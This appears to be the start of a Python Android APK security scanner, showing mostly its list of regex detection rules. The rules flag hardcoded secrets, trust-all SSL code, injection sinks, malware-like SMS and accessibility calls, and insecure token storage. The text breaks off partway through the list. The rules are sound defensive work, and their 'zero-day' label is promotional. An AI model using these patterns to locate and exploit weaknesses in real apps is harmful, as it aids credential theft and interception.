#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ApkViper v2.0.0 - Advanced Android Security Assessment Platform
================================================================
Fully standalone. Pure Python. No external dependencies.
Works on Windows, Linux, macOS. Single file.

  python apkviper.py                          Launch GUI
  python apkviper.py --scan app.apk           Headless scan
  python apkviper.py --scan app.apk --format html --output report.html
  python apkviper.py --server --port 8089     REST API
  python apkviper.py --help
"""

import os, sys, re, json, csv, struct, time, hashlib, argparse, threading, math
import zipfile, io, webbrowser, tempfile, socket, traceback
import urllib.request, urllib.error, urllib.parse, ssl
from pathlib import Path
from datetime import datetime, timezone
from collections import OrderedDict
from http.server import HTTPServer, BaseHTTPRequestHandler

APP_NAME = "ApkViper"
VERSION  = "2.0.0"
AUTHOR   = "Darkfox"
SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
SESSION_DIR = os.path.join(str(Path.home()), ".apkviper")

# Live threat feed rules (populated at runtime by fetch)
_LIVE_RULES = []

# ============================================================
#  50 SECURITY RULES
# ============================================================
RULES = [
    {"id":"AV-MAN-001","name":"Debuggable Application","sev":"CRITICAL","cwe":"CWE-489","owasp":"M9","regex":r'android:debuggable\s*=\s*"true"',"types":["MANIFEST"],"desc":"App is debuggable in production.","fix":"Set android:debuggable=\"false\".","cvss":9.8},
    {"id":"AV-MAN-002","name":"Backup Enabled","sev":"HIGH","cwe":"CWE-530","owasp":"M2","regex":r'android:allowBackup\s*=\s*"true"',"types":["MANIFEST"],"desc":"App data can be backed up via adb.","fix":"Set android:allowBackup=\"false\".","cvss":7.5},
    {"id":"AV-MAN-003","name":"Cleartext Traffic","sev":"HIGH","cwe":"CWE-319","owasp":"M3","regex":r'android:usesCleartextTraffic\s*=\s*"true"',"types":["MANIFEST"],"desc":"HTTP allowed, MITM possible.","fix":"Set usesCleartextTraffic=\"false\".","cvss":7.4},
    {"id":"AV-MAN-004","name":"Exported Component","sev":"HIGH","cwe":"CWE-926","owasp":"M1","regex":r'android:exported\s*=\s*"true"',"types":["MANIFEST"],"desc":"Component accessible to other apps.","fix":"Set exported=\"false\" or add permissions.","cvss":7.5},
    {"id":"AV-CRY-001","name":"Weak Hash (MD5/SHA1)","sev":"MEDIUM","cwe":"CWE-328","owasp":"M5","regex":r'(?i)MessageDigest\.getInstance\s*\(\s*"(MD5|SHA-?1)"\s*\)',"types":["SOURCE"],"desc":"MD5/SHA1 are broken.","fix":"Use SHA-256 or SHA-3.","cvss":5.3},
    {"id":"AV-CRY-002","name":"Weak Crypto (DES/RC4/ECB)","sev":"HIGH","cwe":"CWE-327","owasp":"M5","regex":r'(?i)Cipher\.getInstance\s*\(\s*"(DES|RC4|.*ECB.*)"',"types":["SOURCE"],"desc":"Insecure cipher.","fix":"Use AES/GCM/NoPadding.","cvss":7.5},
    {"id":"AV-CRY-003","name":"Insecure Random","sev":"MEDIUM","cwe":"CWE-330","owasp":"M5","regex":r'new\s+java\.util\.Random\s*\(|new\s+Random\s*\(',"types":["SOURCE"],"desc":"Predictable RNG.","fix":"Use SecureRandom.","cvss":5.3},
    {"id":"AV-CRY-004","name":"Hardcoded Crypto Key","sev":"CRITICAL","cwe":"CWE-321","owasp":"M5","regex":r'(?i)SecretKeySpec\s*\(\s*"[^"]{8,}"',"types":["SOURCE"],"desc":"Hardcoded encryption key.","fix":"Use Android Keystore.","cvss":9.1},
    {"id":"AV-SEC-001","name":"Hardcoded Secret/API Key","sev":"CRITICAL","cwe":"CWE-798","owasp":"M9","regex":r'(?i)(api[_-]?key|secret[_-]?key|password|token|auth|credentials|private[_-]?key|aws[_-]?access|firebase)\s*[=:]\s*"[A-Za-z0-9+/=_\-]{8,}"',"types":["SOURCE","RESOURCE"],"desc":"Secrets extractable via decompilation.","fix":"Fetch from secure backend.","cvss":9.8},
    {"id":"AV-SEC-002","name":"Sensitive Data in Logs","sev":"HIGH","cwe":"CWE-532","owasp":"M2","regex":r'(?i)Log\.(d|v|i|w|e)\s*\([^)]*?(password|token|secret|key|auth|credit|ssn)',"types":["SOURCE"],"desc":"Sensitive data logged.","fix":"Remove from logs.","cvss":7.5},
    {"id":"AV-SEC-003","name":"Clipboard Leak","sev":"MEDIUM","cwe":"CWE-200","owasp":"M2","regex":r'ClipboardManager|clipData|setPrimaryClip',"types":["SOURCE"],"desc":"Clipboard data accessible.","fix":"Avoid clipboard for secrets.","cvss":5.3},
    {"id":"AV-SEC-004","name":"Insecure SharedPreferences","sev":"HIGH","cwe":"CWE-922","owasp":"M2","regex":r'MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE',"types":["SOURCE"],"desc":"World-readable prefs.","fix":"Use MODE_PRIVATE.","cvss":7.5},
    {"id":"AV-SEC-005","name":"World-Readable Files","sev":"HIGH","cwe":"CWE-276","owasp":"M2","regex":r'(?i)(openFileOutput|FileOutputStream)\s*\([^)]*MODE_WORLD',"types":["SOURCE"],"desc":"Files accessible to all apps.","fix":"Use MODE_PRIVATE.","cvss":7.5},
    {"id":"AV-NET-001","name":"Trust All Certificates","sev":"CRITICAL","cwe":"CWE-295","owasp":"M3","regex":r'(?i)(TrustAllCerts|AllowAllHostnameVerifier|ALLOW_ALL_HOSTNAME_VERIFIER|X509TrustManager.*checkServerTrusted\s*\([^)]*\)\s*\{\s*\})',"types":["SOURCE"],"desc":"SSL validation disabled.","fix":"Use proper TrustManager.","cvss":9.8},
    {"id":"AV-NET-002","name":"Weak Network Config","sev":"HIGH","cwe":"CWE-295","owasp":"M3","regex":r'cleartextTrafficPermitted\s*=\s*"true"',"types":["RESOURCE"],"desc":"Cleartext allowed in NSC.","fix":"Set to false.","cvss":7.4},
    {"id":"AV-NET-003","name":"Insecure WebView","sev":"HIGH","cwe":"CWE-749","owasp":"M1","regex":r'(?i)(setJavaScriptEnabled\s*\(\s*true|setAllowFileAccess\s*\(\s*true|setMixedContentMode)',"types":["SOURCE"],"desc":"WebView dangerous settings.","fix":"Disable JS/file access.","cvss":7.5},
    {"id":"AV-NET-004","name":"SSL Error Override","sev":"CRITICAL","cwe":"CWE-295","owasp":"M3","regex":r'onReceivedSslError.*proceed\s*\(',"types":["SOURCE"],"desc":"SSL errors ignored.","fix":"Don't override SSL handler.","cvss":9.8},
    {"id":"AV-NET-005","name":"Certificate Bypass","sev":"CRITICAL","cwe":"CWE-295","owasp":"M3","regex":r'(?i)(setHostnameVerifier\s*\(\s*SSLSocketFactory\.ALLOW_ALL|verify\s*\([^)]*\)\s*\{\s*return\s+true)',"types":["SOURCE"],"desc":"Hostname verification bypassed.","fix":"Use default verifier.","cvss":9.8},
    {"id":"AV-PLT-001","name":"Zip Path Traversal","sev":"HIGH","cwe":"CWE-22","owasp":"M1","regex":r'(?i)ZipEntry.*getName\(\)(?!.*canonical)',"types":["SOURCE"],"desc":"Zip Slip vulnerability.","fix":"Validate extracted paths.","cvss":8.1},
    {"id":"AV-PLT-002","name":"Mutable PendingIntent","sev":"HIGH","cwe":"CWE-927","owasp":"M1","regex":r'PendingIntent\.(getActivity|getBroadcast|getService)\s*\([^)]*,\s*0\s*\)',"types":["SOURCE"],"desc":"PendingIntent hijackable.","fix":"Use FLAG_IMMUTABLE.","cvss":7.5},
    {"id":"AV-PLT-003","name":"Content Provider Injection","sev":"HIGH","cwe":"CWE-89","owasp":"M1","regex":r'(?i)(rawQuery|execSQL)\s*\([^)]*\+\s*(request|uri|input|param)',"types":["SOURCE"],"desc":"SQL injection via provider.","fix":"Use parameterized queries.","cvss":8.6},
    {"id":"AV-PLT-004","name":"Broadcast Theft","sev":"MEDIUM","cwe":"CWE-927","owasp":"M1","regex":r'sendBroadcast\s*\(\s*new\s+Intent\s*\(',"types":["SOURCE"],"desc":"Implicit broadcast leaks.","fix":"Use LocalBroadcastManager.","cvss":5.3},
    {"id":"AV-PLT-005","name":"Deeplink Hijack","sev":"MEDIUM","cwe":"CWE-939","owasp":"M1","regex":r'<data\s+android:scheme\s*=\s*"(http|https|[a-z]+)"',"types":["MANIFEST"],"desc":"Unvalidated deeplinks.","fix":"Validate parameters.","cvss":6.1},
    {"id":"AV-INJ-001","name":"SQL Injection","sev":"CRITICAL","cwe":"CWE-89","owasp":"M7","regex":r'(?i)(rawQuery|execSQL)\s*\(\s*"[^"]*"\s*\+',"types":["SOURCE"],"desc":"SQL injection via concat.","fix":"Use parameterized queries.","cvss":9.8},
    {"id":"AV-INJ-002","name":"Command Injection","sev":"CRITICAL","cwe":"CWE-78","owasp":"M7","regex":r'Runtime\.getRuntime\(\)\.exec\s*\([^)]*\+',"types":["SOURCE"],"desc":"OS command injection.","fix":"Avoid shell commands.","cvss":9.8},
    {"id":"AV-INJ-003","name":"Tapjacking","sev":"MEDIUM","cwe":"CWE-1021","owasp":"M1","regex":r'(?i)setOnClickListener|OnTouchListener',"types":["SOURCE"],"desc":"Overlay attack possible.","fix":"Set filterTouchesWhenObscured.","cvss":4.3},
    {"id":"AV-RES-001","name":"Root Detection","sev":"INFO","cwe":"CWE-919","owasp":"M8","regex":r'(?i)(su\b|/system/xbin/su|Superuser|com\.topjohnwu\.magisk|isRooted)',"types":["SOURCE"],"desc":"Root detection found.","fix":"Use SafetyNet/Play Integrity.","cvss":3.7},
    {"id":"AV-RES-002","name":"Emulator Detection","sev":"INFO","cwe":"CWE-919","owasp":"M8","regex":r'(?i)(Build\.(FINGERPRINT|MODEL).*generic|goldfish|ranchu|isEmulator)',"types":["SOURCE"],"desc":"Emulator detection found.","fix":"Combine with attestation.","cvss":3.7},
    {"id":"AV-RES-003","name":"Dynamic Code Loading","sev":"HIGH","cwe":"CWE-94","owasp":"M7","regex":r'(?i)(DexClassLoader|PathClassLoader|loadDex|dalvik\.system)',"types":["SOURCE"],"desc":"Runtime code loading.","fix":"Verify loaded code integrity.","cvss":8.1},
    {"id":"AV-RES-004","name":"Unsafe Deserialization","sev":"HIGH","cwe":"CWE-502","owasp":"M7","regex":r'(?i)(ObjectInputStream|readObject\s*\()',"types":["SOURCE"],"desc":"Deserialization risk.","fix":"Validate objects.","cvss":8.1},
    {"id":"AV-PRV-001","name":"Dangerous Permissions","sev":"MEDIUM","cwe":"CWE-250","owasp":"M1","regex":r'(?i)android\.permission\.(READ_CONTACTS|READ_SMS|CAMERA|RECORD_AUDIO|ACCESS_FINE_LOCATION|READ_PHONE_STATE|SEND_SMS)',"types":["MANIFEST"],"desc":"Dangerous permissions requested.","fix":"Minimize permissions.","cvss":5.3},
    {"id":"AV-PRV-002","name":"Tracker SDK","sev":"MEDIUM","cwe":"CWE-359","owasp":"M2","regex":r'(?i)(com\.facebook\..*sdk|com\.google\.firebase\.analytics|com\.appsflyer|com\.adjust\.sdk|com\.mixpanel|com\.amplitude|io\.branch)',"types":["SOURCE","MANIFEST"],"desc":"Tracking SDK detected.","fix":"Disclose in privacy policy.","cvss":4.3},
    {"id":"AV-PRV-003","name":"Hardcoded URL/IP","sev":"LOW","cwe":"CWE-200","owasp":"M9","regex":r'https?://[a-zA-Z0-9._/\-:]+',"types":["SOURCE"],"desc":"URLs reveal infrastructure.","fix":"Use config files.","cvss":3.7},
    {"id":"AV-CLD-001","name":"Firebase Misconfiguration","sev":"HIGH","cwe":"CWE-284","owasp":"M1","regex":r'(?i)(firebaseio\.com|firebase\.googleapis\.com)',"types":["SOURCE","RESOURCE"],"desc":"Firebase endpoints exposed.","fix":"Secure Firebase rules.","cvss":7.5},
    {"id":"AV-AUT-001","name":"Insecure Auth Storage","sev":"HIGH","cwe":"CWE-522","owasp":"M4","regex":r'(?i)(getSharedPreferences|SharedPreferences).*?(password|token|session|auth)',"types":["SOURCE"],"desc":"Credentials in SharedPrefs.","fix":"Use Android Keystore.","cvss":7.5},
    {"id":"AV-AUT-002","name":"Insecure Session","sev":"HIGH","cwe":"CWE-384","owasp":"M6","regex":r'(?i)(JSESSIONID|session_id|sessionToken)\s*=\s*"',"types":["SOURCE"],"desc":"Hardcoded session.","fix":"Generate server-side.","cvss":7.5},
    {"id":"AV-WEB-001","name":"WebView XSS","sev":"HIGH","cwe":"CWE-79","owasp":"M7","regex":r'addJavascriptInterface\s*\(',"types":["SOURCE"],"desc":"JS interface exposed.","fix":"Validate input.","cvss":8.1},
    {"id":"AV-WEB-002","name":"XXE Injection","sev":"HIGH","cwe":"CWE-611","owasp":"M7","regex":r'(?i)(XMLInputFactory|SAXParser|DocumentBuilder)(?!.*disallow)',"types":["SOURCE"],"desc":"XXE possible.","fix":"Disable external entities.","cvss":7.5},
    {"id":"AV-WEB-003","name":"SSRF","sev":"HIGH","cwe":"CWE-918","owasp":"M7","regex":r'(?i)(URL\s*\(\s*[^"]*\+|openConnection\s*\(\s*\).*user)',"types":["SOURCE"],"desc":"SSRF risk.","fix":"Validate URLs.","cvss":7.5},
    {"id":"AV-OTH-001","name":"Debug Code in Production","sev":"MEDIUM","cwe":"CWE-489","owasp":"M10","regex":r'(?i)(TODO|FIXME|HACK|DEBUG|test.*password|backdoor)',"types":["SOURCE"],"desc":"Debug artifacts found.","fix":"Remove before release.","cvss":5.3},
    {"id":"AV-OTH-002","name":"Malware Pattern","sev":"CRITICAL","cwe":"CWE-506","owasp":"M10","regex":r'(?i)(SmsManager\.send|DeviceAdminReceiver|AccessibilityService.*performAction)',"types":["SOURCE"],"desc":"Suspicious behavior.","fix":"Review functionality.","cvss":9.8},
    {"id":"AV-OTH-003","name":"Native Library","sev":"MEDIUM","cwe":"CWE-676","owasp":"M7","regex":r'(?i)(System\.loadLibrary|System\.load\s*\()',"types":["SOURCE"],"desc":"Native code loaded.","fix":"Audit native libs.","cvss":5.3},
    {"id":"AV-NET-006","name":"SSL Pinning","sev":"MEDIUM","cwe":"CWE-295","owasp":"M3","regex":r'(?i)(CertificatePinner|network_security_config|ssl.*pin)',"types":["SOURCE","RESOURCE"],"desc":"SSL pinning implementation.","fix":"Use multiple techniques.","cvss":5.3},
    {"id":"AV-SEC-006","name":"Sensitive File","sev":"MEDIUM","cwe":"CWE-312","owasp":"M2","regex":r'(?i)\.(p12|pfx|pem|key|cer|bks|jks|keystore|db|sqlite)',"types":["SOURCE","RESOURCE"],"desc":"Sensitive file in APK.","fix":"Don't ship secrets.","cvss":6.5},
    {"id":"AV-AUT-003","name":"Weak Password Policy","sev":"MEDIUM","cwe":"CWE-521","owasp":"M4","regex":r'(?i)(password.*\.length\s*[<>]=?\s*[1-5][^0-9])',"types":["SOURCE"],"desc":"Weak password requirement.","fix":"Min 8 chars + complexity.","cvss":5.3},
    {"id":"AV-PLT-006","name":"Fragment Injection","sev":"HIGH","cwe":"CWE-470","owasp":"M1","regex":r'(?i)(PreferenceActivity|isValidFragment\s*\([^)]*\)\s*\{\s*return\s+true)',"types":["SOURCE"],"desc":"Fragment injection risk.","fix":"Override isValidFragment.","cvss":7.5},
    {"id":"AV-WEB-004","name":"Open Redirect","sev":"MEDIUM","cwe":"CWE-601","owasp":"M7","regex":r'(?i)(redirect|location)\s*[=:]\s*[^"]*\+\s*(request|intent|getParameter)',"types":["SOURCE"],"desc":"Unvalidated redirect.","fix":"Whitelist targets.","cvss":6.1},
    {"id":"AV-RES-005","name":"Missing Obfuscation","sev":"MEDIUM","cwe":"CWE-656","owasp":"M9","regex":r'(?i)(BuildConfig\.DEBUG|proguard-rules)',"types":["SOURCE"],"desc":"Code not obfuscated.","fix":"Enable R8/ProGuard.","cvss":4.3},
    {"id":"AV-PRV-004","name":"GDPR Consent","sev":"MEDIUM","cwe":"CWE-359","owasp":"M2","regex":r'(?i)(ConsentInformation|GDPR|privacy.*consent)',"types":["SOURCE"],"desc":"GDPR consent referenced.","fix":"Implement consent flow.","cvss":4.3},
    {"id":"AV-RES-006","name":"Weak Biometric","sev":"MEDIUM","cwe":"CWE-287","owasp":"M4","regex":r'(?i)(BiometricPrompt|FingerprintManager)(?!.*CryptoObject)',"types":["SOURCE"],"desc":"Biometric without CryptoObject.","fix":"Use CryptoObject.","cvss":6.5},
    # ══════════════════════════════════════════════════════════════
    #  50 NEW ZERO-DAY DETECTION RULES (2025-2026 Attack Surfaces)
    # ══════════════════════════════════════════════════════════════
    {"id":"AV-ZD-001","name":"Intent Redirection via Parcelable","sev":"CRITICAL","cwe":"CWE-940","owasp":"M1","regex":r'(?i)getParcelableExtra\s*\([^)]*\).*startActivity',"types":["SOURCE"],"desc":"Exported component forwards untrusted Intent to startActivity enabling launch of non-exported components.","fix":"Validate nested Intent targets. Use IntentSanitizer.","cvss":9.1},
    {"id":"AV-ZD-002","name":"Implicit Intent with Sensitive Extras","sev":"HIGH","cwe":"CWE-927","owasp":"M1","regex":r'(?i)new\s+Intent\s*\(\s*"[^"]*"\s*\).*putExtra\s*\([^)]*?(token|session|auth|password|otp|secret)',"types":["SOURCE"],"desc":"Implicit intent broadcasts sensitive data interceptable by any app.","fix":"Use explicit intents with setPackage() or setComponent().","cvss":7.8},
    {"id":"AV-ZD-003","name":"Unprotected FileProvider Root Path","sev":"HIGH","cwe":"CWE-22","owasp":"M2","regex":r'(?i)<root-path\s+name\s*=\s*"[^"]*"\s+path\s*=\s*"\.?"',"types":["RESOURCE"],"desc":"FileProvider grants access to entire filesystem root.","fix":"Restrict paths to specific app directories only.","cvss":8.1},
    {"id":"AV-ZD-004","name":"WebView postMessage Handler XSS","sev":"HIGH","cwe":"CWE-79","owasp":"M7","regex":r'(?i)(onMessage|postMessage|evaluateJavascript)\s*\([^)]*getIntent',"types":["SOURCE"],"desc":"WebView processes unvalidated messages from Intent data.","fix":"Validate origin and sanitize postMessage data.","cvss":7.5},
    {"id":"AV-ZD-005","name":"Unsafe Reflection from Intent","sev":"CRITICAL","cwe":"CWE-470","owasp":"M7","regex":r'(?i)(Class\.forName|getMethod|getDeclaredMethod)\s*\([^)]*?(getExtra|getIntent|getString)',"types":["SOURCE"],"desc":"Class/method loaded dynamically from untrusted Intent input.","fix":"Never use untrusted input for reflection. Whitelist allowed classes.","cvss":9.8},
    {"id":"AV-ZD-006","name":"Exported Service No Caller Check","sev":"HIGH","cwe":"CWE-862","owasp":"M1","regex":r'(?i)onBind\s*\([^)]*\)\s*\{[^}]*return\s+(new|this|mBinder)',"types":["SOURCE"],"desc":"Service returns binder without checking caller identity.","fix":"Check Binder.getCallingUid() and validate permissions.","cvss":7.8},
    {"id":"AV-ZD-007","name":"ContentProvider openFile Path Traversal","sev":"CRITICAL","cwe":"CWE-22","owasp":"M2","regex":r'(?i)openFile\s*\(\s*Uri',"types":["SOURCE"],"desc":"ContentProvider openFile without path canonicalization check.","fix":"Use Uri.getLastPathSegment() and validate with canonical path.","cvss":9.1},
    {"id":"AV-ZD-008","name":"Weak KeyStore Key Size","sev":"HIGH","cwe":"CWE-326","owasp":"M5","regex":r'(?i)KeyGenParameterSpec.*setKeySize\s*\(\s*(128|64|56)\s*\)',"types":["SOURCE"],"desc":"Crypto key generated with insufficient key size.","fix":"Use minimum 256-bit keys for AES.","cvss":7.5},
    {"id":"AV-ZD-009","name":"Downloaded Code Without Integrity","sev":"CRITICAL","cwe":"CWE-494","owasp":"M7","regex":r'(?i)(URLConnection|HttpClient|OkHttp|Retrofit).*\.(dex|jar|apk|so)\b',"types":["SOURCE"],"desc":"Downloads executable code without signature verification.","fix":"Verify code hash/signature before loading.","cvss":9.8},
    {"id":"AV-ZD-010","name":"Implicit PendingIntent in Notification","sev":"HIGH","cwe":"CWE-927","owasp":"M1","regex":r'(?i)Notification.*PendingIntent\.get(Activity|Broadcast|Service)\s*\([^)]*new\s+Intent\s*\(\s*"',"types":["SOURCE"],"desc":"Notification uses mutable implicit PendingIntent hijackable by attacker.","fix":"Use FLAG_IMMUTABLE and explicit Intent.","cvss":7.5},
    {"id":"AV-ZD-011","name":"Exported Receiver No Permission","sev":"HIGH","cwe":"CWE-862","owasp":"M1","regex":r'(?i)<receiver[^>]*android:exported\s*=\s*"true"[^>]*(?!.*permission)[^>]*>',"types":["MANIFEST"],"desc":"Exported receiver without permission requirement.","fix":"Add android:permission to restrict senders.","cvss":7.5},
    {"id":"AV-ZD-012","name":"Plaintext HTTP API Endpoint","sev":"HIGH","cwe":"CWE-319","owasp":"M3","regex":r'http://[a-zA-Z0-9][\w.-]+\.(com|net|org|io|dev|app)/[a-zA-Z0-9/._-]+',"types":["SOURCE","RESOURCE"],"desc":"API endpoint uses plaintext HTTP exposing communication to MITM.","fix":"Migrate all endpoints to HTTPS.","cvss":7.4},
    {"id":"AV-ZD-013","name":"Unsafe Login Intent Launch","sev":"HIGH","cwe":"CWE-927","owasp":"M4","regex":r'(?i)startActivity\s*\([^)]*login|startActivity\s*\([^)]*auth',"types":["SOURCE"],"desc":"Auth activity launched without explicit component. Phishing risk.","fix":"Always use explicit intents for authentication flows.","cvss":8.1},
    {"id":"AV-ZD-014","name":"TOCTOU Race in File Access","sev":"HIGH","cwe":"CWE-367","owasp":"M7","regex":r'(?i)(exists\(\)|canRead\(\)|isFile\(\))\s*[){\n]',"types":["SOURCE"],"desc":"Time-of-check time-of-use race condition on file operations.","fix":"Use atomic file operations or file locking.","cvss":7.0},
    {"id":"AV-ZD-015","name":"Insecure JWT None Algorithm","sev":"CRITICAL","cwe":"CWE-347","owasp":"M4","regex":r'(?i)(setSigningKey|parseClaimsJws|verify)\s*\([^)]*"(none|None|NONE)"',"types":["SOURCE"],"desc":"JWT accepts none algorithm bypassing signature validation.","fix":"Enforce RS256/ES256 and validate algorithm header.","cvss":9.8},
    {"id":"AV-ZD-016","name":"Sensitive Exported Activity","sev":"HIGH","cwe":"CWE-862","owasp":"M1","regex":r'(?i)<activity[^>]*android:exported\s*=\s*"true"[^>]*name\s*=\s*"[^"]*?(Admin|Setting|Dashboard|Internal|Debug|Config|Payment|Profile|Account)',"types":["MANIFEST"],"desc":"Sensitive activity exported without authentication enforcement.","fix":"Set exported=false or add permission check.","cvss":8.6},
    {"id":"AV-ZD-017","name":"Stack Trace in Logs","sev":"MEDIUM","cwe":"CWE-209","owasp":"M10","regex":r'(?i)printStackTrace\s*\(',"types":["SOURCE"],"desc":"Stack traces in logs reveal internal code structure to attackers.","fix":"Use generic error messages. Remove in production builds.","cvss":5.3},
    {"id":"AV-ZD-018","name":"Hardcoded FCM Server Key","sev":"CRITICAL","cwe":"CWE-798","owasp":"M9","regex":r'(?i)AAAA[A-Za-z0-9_-]{7,}:APA91b[A-Za-z0-9_-]{50,}',"types":["SOURCE","RESOURCE"],"desc":"FCM server key in app allows sending push notifications to all users.","fix":"Move FCM server key to backend only. Never embed in client.","cvss":9.1},
    {"id":"AV-ZD-019","name":"Unsafe URI Parse from Input","sev":"HIGH","cwe":"CWE-20","owasp":"M7","regex":r'(?i)Uri\.parse\s*\(\s*(getIntent|intent\.|getExtra|getString|input|request|param)',"types":["SOURCE"],"desc":"User-controlled string parsed as URI without validation.","fix":"Validate URI scheme whitelist before parsing.","cvss":7.5},
    {"id":"AV-ZD-020","name":"Custom Permission Normal Level","sev":"MEDIUM","cwe":"CWE-276","owasp":"M1","regex":r'(?i)<permission[^>]*protectionLevel\s*=\s*"normal"[^>]*>',"types":["MANIFEST"],"desc":"Custom permission too permissive, any app can request it.","fix":"Use signature protectionLevel for inter-app permissions.","cvss":5.9},
    {"id":"AV-ZD-021","name":"Unencrypted SQLite Database","sev":"HIGH","cwe":"CWE-311","owasp":"M2","regex":r'(?i)(SQLiteDatabase\.openOrCreate|openDatabase|getWritableDatabase|getReadableDatabase)\s*\(',"types":["SOURCE"],"desc":"Database stored unencrypted, extractable on rooted device.","fix":"Use SQLCipher or EncryptedSharedPreferences.","cvss":7.5},
    {"id":"AV-ZD-022","name":"Static IV for Encryption","sev":"HIGH","cwe":"CWE-329","owasp":"M5","regex":r'(?i)IvParameterSpec\s*\(\s*"[^"]*"\.getBytes',"types":["SOURCE"],"desc":"Static IV makes AES-CBC/CTR deterministic and breakable.","fix":"Generate random IV with SecureRandom for each encryption.","cvss":7.5},
    {"id":"AV-ZD-023","name":"Credentials in URL Query String","sev":"HIGH","cwe":"CWE-598","owasp":"M3","regex":r'(?i)https?://[^"]*\?[^"]*?(token|password|secret|key|session|auth|api_key)\s*=',"types":["SOURCE"],"desc":"Credentials in URL visible in server logs, referrer headers, and proxies.","fix":"Use POST body or headers for sensitive data.","cvss":7.5},
    {"id":"AV-ZD-024","name":"Sensitive Data to Clipboard","sev":"MEDIUM","cwe":"CWE-200","owasp":"M2","regex":r'(?i)ClipData\.newPlainText\s*\([^)]*?(password|token|otp|pin|secret|credit|card)',"types":["SOURCE"],"desc":"Sensitive data copied to clipboard persists and is readable by other apps.","fix":"Use ClipboardManager.clearPrimaryClip() after timeout.","cvss":5.9},
    {"id":"AV-ZD-025","name":"Exposed Debug Endpoint","sev":"CRITICAL","cwe":"CWE-489","owasp":"M10","regex":r'(?i)"https?://[^"]*(/debug|/admin|/swagger|/graphql|/api-docs|/actuator|/_internal|/console)',"types":["SOURCE","RESOURCE"],"desc":"Debug/admin endpoint accessible in production build.","fix":"Remove or restrict debug endpoints before release.","cvss":9.1},
    {"id":"AV-ZD-026","name":"Unsafe Parcel Read No Type Check","sev":"HIGH","cwe":"CWE-502","owasp":"M7","regex":r'(?i)(readParcelable|readSerializable)\s*\(\s*(getClassLoader|null|[A-Z])',"types":["SOURCE"],"desc":"Deserialized Parcelable object without type verification.","fix":"Check instanceof before casting parcelable data.","cvss":7.8},
    {"id":"AV-ZD-027","name":"No Network Security Config","sev":"MEDIUM","cwe":"CWE-295","owasp":"M3","regex":r'(?i)android:networkSecurityConfig\s*=\s*"@xml/network',"types":["MANIFEST"],"desc":"Network security config detected - verify cleartext restrictions.","fix":"Ensure cleartextTrafficPermitted=false for all domains.","cvss":5.3},
    {"id":"AV-ZD-028","name":"OAuth Token in SharedPrefs","sev":"HIGH","cwe":"CWE-922","owasp":"M4","regex":r'(?i)(putString|edit\(\))\s*.*?(oauth|access_token|refresh_token|bearer|id_token)',"types":["SOURCE"],"desc":"OAuth tokens stored in plaintext SharedPreferences.","fix":"Use EncryptedSharedPreferences or Android Keystore.","cvss":7.5},
    {"id":"AV-ZD-029","name":"Missing Certificate Transparency","sev":"MEDIUM","cwe":"CWE-295","owasp":"M3","regex":r'(?i)OkHttpClient\.Builder\s*\(\s*\)(?!.*certificateTransparency)',"types":["SOURCE"],"desc":"No Certificate Transparency validation configured.","fix":"Enable CT checking in OkHttp or network security config.","cvss":5.3},
    {"id":"AV-ZD-030","name":"Custom HostnameVerifier Bypass","sev":"CRITICAL","cwe":"CWE-295","owasp":"M3","regex":r'(?i)new\s+HostnameVerifier\s*\(\s*\)\s*\{[^}]*return\s+true',"types":["SOURCE"],"desc":"Custom hostname verifier accepts all hosts enabling MITM.","fix":"Use default hostname verifier. Never return true unconditionally.","cvss":9.1},
    {"id":"AV-ZD-031","name":"Crypto Key in String Object","sev":"HIGH","cwe":"CWE-244","owasp":"M5","regex":r'(?i)String\s+\w*(password|key|secret|token)\w*\s*=\s*"[^"]{8,}"',"types":["SOURCE"],"desc":"Crypto material stored in immutable String stays in heap memory.","fix":"Use char[] or byte[] and Arrays.fill() after use.","cvss":7.0},
    {"id":"AV-ZD-032","name":"ContentResolver Concat Query","sev":"HIGH","cwe":"CWE-89","owasp":"M7","regex":r'(?i)contentResolver\.\w+\s*\([^)]*\+\s*(uri|input|request|param|extra|str)',"types":["SOURCE"],"desc":"Content resolver query built with concatenated user input.","fix":"Use SelectionArgs for parameterized queries.","cvss":8.1},
    {"id":"AV-ZD-033","name":"Missing FLAG_SECURE","sev":"MEDIUM","cwe":"CWE-200","owasp":"M2","regex":r'(?i)(setContentView|onCreate).*?(Login|Payment|Pin|Otp|Password|Auth|Bank|Credit|Secret)',"types":["SOURCE"],"desc":"Sensitive screen can be captured in screenshots and recent apps.","fix":"Set FLAG_SECURE in onCreate to prevent screen capture.","cvss":5.3},
    {"id":"AV-ZD-034","name":"AccountManager Token Exposure","sev":"HIGH","cwe":"CWE-522","owasp":"M4","regex":r'(?i)AccountManager\.(getAuthToken|peekAuthToken|setAuthToken)\s*\(',"types":["SOURCE"],"desc":"AccountManager tokens accessible to apps with MANAGE_ACCOUNTS.","fix":"Use custom account type with signature-level permission.","cvss":7.0},
    {"id":"AV-ZD-035","name":"Auth State Race Condition","sev":"HIGH","cwe":"CWE-362","owasp":"M4","regex":r'(?i)(isLoggedIn|isAuthenticated|checkAuth)\s*\(\s*\)\s*[){]\s*\n.*?startActivity',"types":["SOURCE"],"desc":"Auth check and activity launch not atomic creating race window.","fix":"Use synchronized auth state with server-validated token.","cvss":7.0},
    {"id":"AV-ZD-036","name":"Third-Party Analytics SDK","sev":"MEDIUM","cwe":"CWE-359","owasp":"M2","regex":r'(?i)(com\.appsflyer|com\.adjust\.|io\.branch|com\.mparticle|com\.segment|com\.clevertap|com\.onesignal)',"types":["SOURCE","MANIFEST"],"desc":"Third-party analytics SDK collecting user data.","fix":"Audit SDK data collection. Implement consent management.","cvss":5.3},
    {"id":"AV-ZD-037","name":"Unverified App Links","sev":"HIGH","cwe":"CWE-939","owasp":"M1","regex":r'(?i)android:autoVerify\s*=\s*"true"',"types":["MANIFEST"],"desc":"App Links declared but may lack proper assetlinks.json validation.","fix":"Verify Digital Asset Links JSON hosted correctly on all domains.","cvss":7.5},
    {"id":"AV-ZD-038","name":"WebView Unrestricted URL Loading","sev":"HIGH","cwe":"CWE-601","owasp":"M7","regex":r'(?i)shouldOverrideUrlLoading\s*\([^)]*\)\s*\{[^}]{0,50}return\s+false',"types":["SOURCE"],"desc":"WebView loads all URLs without scheme or host validation.","fix":"Validate URL scheme and whitelist allowed hosts.","cvss":7.5},
